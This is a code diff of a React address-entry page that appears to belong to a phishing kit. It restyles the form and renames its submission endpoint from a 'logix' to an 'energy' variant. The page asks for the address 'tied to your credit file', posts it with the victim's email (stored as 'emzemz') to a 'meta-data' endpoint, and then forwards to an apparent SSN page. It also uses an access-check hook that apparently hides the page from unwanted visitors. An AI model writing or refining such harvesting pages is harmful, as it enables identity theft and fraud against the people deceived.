@@ -3,6 +3,11 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
+import FlowCard from '../components/FlowCard';
+import FormError from '../components/FormError';
+
+const inputClasses =
+  'w-full bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00b4ff]';
 
 const HomeAddress: React.FC = () => {
   const [stAd, setStAd] = useState('');
@@ -11,45 +16,34 @@ const HomeAddress: React.FC = () => {
   const [state, setState] = useState('');
   const [zipCode, setZipCode] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [errors, setErrors] = useState({ 
-    stAd: '', 
-    apt: '', 
-    city: '', 
-    state: '', 
-    zipCode: '' 
-  });
+  const [errors, setErrors] = useState({ stAd: '', city: '', state: '', zipCode: '', form: '' });
 
   const navigate = useNavigate();
   const location = useLocation();
   const { emzemz } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
 
-  // Debug: Log the received email
-  console.log('HomeAddress received email:', emzemz);
-
-  // Show loading state while checking access
   if (!isAllowed) {
-    return <div>Loading...</div>; // Or a proper loading spinner
+    return null;
   }
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     setIsLoading(true);
 
-    let newErrors = {
-      stAd: !stAd.trim() ? 'Street Address is required' : '',
-      city: !city.trim() ? 'City is required' : '',
-      state: !state.trim() ? 'State is required' : '',
-      zipCode: !zipCode.trim() ? 'Zip Code is required' : '',
-      apt: ''
+    const newErrors = {
+      stAd: !stAd.trim() ? 'Street address is required.' : '',
+      city: !city.trim() ? 'City is required.' : '',
+      state: !state.trim() ? 'State is required.' : '',
+      zipCode: !zipCode.trim() ? 'Zip code is required.' : '',
+      form: '',
     };
 
     setErrors(newErrors);
 
-    // Check if there are no errors (apt is optional)
     if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
       try {
-        await axios.post(`${baseUrl}api/logix-meta-data-4/`, {
+        await axios.post(`${baseUrl}api/energy-meta-data-4/`, {
           emzemz,
           stAd,
           apt,
@@ -57,161 +51,125 @@ const HomeAddress: React.FC = () => {
           state,
           zipCode,
         });
-        console.log('Home address submitted successfully');
         navigate('/ssn1', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting home address:', error);
-        setErrors(prev => ({
+        setErrors((prev) => ({
           ...prev,
-          form: 'There was an error submitting your address. Please try again.'
+          form: 'There was an error submitting your address. Please try again.',
         }));
         setIsLoading(false);
+        return;
       }
-    } else {
-      setIsLoading(false);
     }
+
+    setIsLoading(false);
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Home Address</h2>
-      </div>
+    <FlowCard
+      title="Confirm Your Home Address"
+      subtitle={<span className="text-slate-300">The address tied to your credit file.</span>}
+    >
+      <form onSubmit={handleSubmit} className="space-y-4">
+        <div>
+          <label className="block text-sm text-slate-300 mb-1" htmlFor="stAd">
+            Street address
+          </label>
+          <input
+            id="stAd"
+            name="stAd"
+            type="text"
+            value={stAd}
+            onChange={(e) => setStAd(e.target.value)}
+            className={inputClasses}
+            placeholder="123 Main St"
+          />
+          {errors.stAd ? <FormError message={errors.stAd} /> : null}
+        </div>
 
-      <div className="px-8 py-6 bg-white space-y-6">
-        <p className="text-sm text-gray-600 text-center mb-8">
-          We'll need you to confirm your home address. The one tied to your credit file.
-        </p>
-        
-        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
-          {/* Street Address */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4 ">
-              <label className="text-gray-700 w-32 text-right">Street Address:</label>
-              <input
-                id="stAd"
-                name="stAd"
-                type="text"
-                value={stAd}
-                onChange={(e) => setStAd(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.stAd && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.stAd}
-              </div>
-            )}
+        <div>
+          <label className="block text-sm text-slate-300 mb-1" htmlFor="apt">
+            Apt or unit (optional)
+          </label>
+          <input
+            id="apt"
+            name="apt"
+            type="text"
+            value={apt}
+            onChange={(e) => setApt(e.target.value)}
+            className={inputClasses}
+            placeholder="Unit"
+          />
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-300 mb-1" htmlFor="city">
+            City
+          </label>
+          <input
+            id="city"
+            name="city"
+            type="text"
+            value={city}
+            onChange={(e) => setCity(e.target.value)}
+            className={inputClasses}
+            placeholder="City"
+          />
+          {errors.city ? <FormError message={errors.city} /> : null}
+        </div>
+
+        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+          <div>
+            <label className="block text-sm text-slate-300 mb-1" htmlFor="state">
+              State
+            </label>
+            <input
+              id="state"
+              name="state"
+              type="text"
+              value={state}
+              onChange={(e) => setState(e.target.value)}
+              className={inputClasses}
+              placeholder="CA"
+            />
+            {errors.state ? <FormError message={errors.state} /> : null}
           </div>
 
-          {/* Apt or Unit */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Apt or Unit (optional):</label>
-              <input
-                id="apt"
-                name="apt"
-                type="text"
-                value={apt}
-                onChange={(e) => setApt(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
+          <div>
+            <label className="block text-sm text-slate-300 mb-1" htmlFor="zipCode">
+              Zip code
+            </label>
+            <input
+              id="zipCode"
+              name="zipCode"
+              type="text"
+              value={zipCode}
+              onChange={(e) => setZipCode(e.target.value)}
+              className={inputClasses}
+              placeholder="90001"
+            />
+            {errors.zipCode ? <FormError message={errors.zipCode} /> : null}
           </div>
+        </div>
 
-          {/* City */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">City:</label>
-              <input
-                id="city"
-                name="city"
-                type="text"
-                value={city}
-                onChange={(e) => setCity(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.city && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.city}
-              </div>
-            )}
-          </div>
+        {errors.form ? (
+          <div className="rounded-md border border-red-400/40 bg-red-950/40 px-4 py-3 text-sm text-red-300">{errors.form}</div>
+        ) : null}
 
-          {/* State */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">State:</label>
-              <input
-                id="state"
-                name="state"
-                type="text"
-                value={state}
-                onChange={(e) => setState(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.state && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.state}
-              </div>
-            )}
-          </div>
-
-          {/* Zip Code */}
-          <div className="mb-6">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Zip Code:</label>
-              <input
-                id="zipCode"
-                name="zipCode"
-                type="text"
-                value={zipCode}
-                onChange={(e) => setZipCode(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.zipCode && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.zipCode}
-              </div>
-            )}
-          </div>
-
-          <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Continue
-              </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
-          </div>
-        </form>
-      </div>
-
-      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
-        <p className="text-xs text-gray-600">
-          Your information is secure and will be used in accordance with our Privacy Policy.
-        </p>
-      </div>
-    </div>
+        <button
+          type="submit"
+          className="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md hover:bg-[#38bdf8] transition disabled:opacity-70"
+          disabled={isLoading}
+        >
+          {isLoading ? (
+            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-black border-t-transparent" />
+          ) : (
+            'Continue'
+          )}
+        </button>
+      </form>
+    </FlowCard>
   );
 };
 
